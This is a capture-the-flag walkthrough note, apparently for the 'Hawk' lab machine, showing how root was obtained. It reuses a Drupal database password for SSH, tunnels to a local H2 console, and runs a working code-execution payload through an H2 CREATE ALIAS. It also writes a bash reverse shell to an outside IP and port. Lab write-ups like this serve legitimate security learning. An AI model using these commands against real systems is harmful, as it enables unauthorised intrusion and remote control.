# Getting Root

```bash
www-data@hawk:/var/www/html$ cat sites/default/settings.php | grep -A3 -B3 password
```
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'drupal4hawk',

![[Pasted image 20211128055455.png]]

Can use this password to login as daniel on SSH

![[Pasted image 20211128055902.png]]



Pivoting to get localhost to connect on port 8082 (only allow connection locally)
```bash
ssh -L 9002:127.0.0.1:8082 daniel@10.10.10.102
daniel@10.10.10.102's password: drupal4hawk
```
![[Pasted image 20211128071731.png]]

login as drupal database using pass: drupal4hawk

![[Pasted image 20211128074519.png]]


Payload https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('id')
```
Create a rev-shell script using the user daniel on /tmp
```bash
daniel@hawk:/tmp$ cat rev-shel.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.21/9001 0>&1
```
![[Pasted image 20211128075541.png]]

![[Pasted image 20211128075826.png]]